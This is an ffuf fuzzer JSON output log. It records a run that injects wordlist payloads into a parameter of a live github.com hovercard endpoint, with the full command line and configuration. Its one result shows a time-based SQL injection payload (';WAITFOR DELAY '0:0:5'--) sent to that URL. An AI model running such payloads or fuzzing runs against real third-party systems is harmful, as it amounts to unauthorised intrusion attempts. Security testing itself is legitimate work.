{"commandline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/303c4a19-c9aa-42f8-ba97-3b07a0be22d4.txt -t 25 -mc 200,302,400,401,403,404,500 -timeout 30 -ac -json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755713837755.json -u https://github.com/juice-shop/juice-shop/hovercards/citation/sidebar_partial?tree_name=master\u0026tree_name=FUZZ -H referer: https://github.com/juice-shop/juice-shop -H x-requested-with: XMLHttpRequest -H accept: text/html -H user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.7204.23 Safari/537.36","time":"2025-08-21T02:17:17+08:00","results":[{"input":{"FFUFHASH":"0d6871","FUZZ":".htaccessAePOHFTW"},"position":1,"status":400,"length":90,"words":8,"lines":4,"content-type":"text/html","redirectlocation":"","scraper":{},"duration":13226167,"resultfile":"","url":"https://github.com/juice-shop/juice-shop/hovercards/citation/sidebar_partial?tree_name=master\u0026tree_name=';WAITFOR DELAY '0:0:5'--","host":"github.com"}],"config":{"autocalibration":true,"autocalibration_keyword":"FUZZ","autocalibration_perhost":false,"autocalibration_strategies":["basic"],"autocalibration_strings":[],"colors":false,"cmdline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/303c4a19-c9aa-42f8-ba97-3b07a0be22d4.txt -t 25 -mc 200,302,400,401,403,404,500 -timeout 30 -ac -json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755713837755.json -u https://github.com/juice-shop/juice-shop/hovercards/citation/sidebar_partial?tree_name=master\u0026tree_name=FUZZ -H referer: https://github.com/juice-shop/juice-shop -H x-requested-with: XMLHttpRequest -H accept: text/html -H user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.7204.23 Safari/537.36","configfile":"","postdata":"","debuglog":"","delay":{"value":"0.00"},"dirsearch_compatibility":false,"encoders":[],"extensions":[],"fmode":"or","follow_redirects":false,"headers":{"Accept":"text/html","Referer":"https://github.com/juice-shop/juice-shop","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.7204.23 Safari/537.36","X-Requested-With":"XMLHttpRequest"},"ignorebody":false,"ignore_wordlist_comments":false,"inputmode":"clusterbomb","cmd_inputnum":100,"inputproviders":[{"name":"wordlist","keyword":"FUZZ","value":"/Users/raphaelpang/code/elise/payloads/temp/303c4a19-c9aa-42f8-ba97-3b07a0be22d4.txt","encoders":"","template":""}],"inputshell":"","json":true,"matchers":{"IsCalibrated":true,"Mutex":{},"Matchers":{"status":{"value":"200,302,400,401,403,404,500"}},"Filters":{},"PerDomainFilters":{}},"mmode":"or","maxtime":0,"maxtime_job":0,"method":"GET","noninteractive":false,"outputdirectory":"","outputfile":"/Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755713837755.json","outputformat":"json","OutputSkipEmptyFile":false,"proxyurl":"","quiet":false,"rate":0,"raw":false,"recursion":false,"recursion_depth":0,"recursion_strategy":"default","replayproxyurl":"","requestfile":"","requestproto":"https","scraperfile":"","scrapers":"all","sni":"","stop_403":false,"stop_all":false,"stop_errors":false,"threads":25,"timeout":30,"url":"https://github.com/juice-shop/juice-shop/hovercards/citation/sidebar_partial?tree_name=master\u0026tree_name=FUZZ","verbose":false,"wordlists":["/Users/raphaelpang/code/elise/payloads/temp/303c4a19-c9aa-42f8-ba97-3b07a0be22d4.txt"],"http2":false,"client-cert":"","client-key":""}}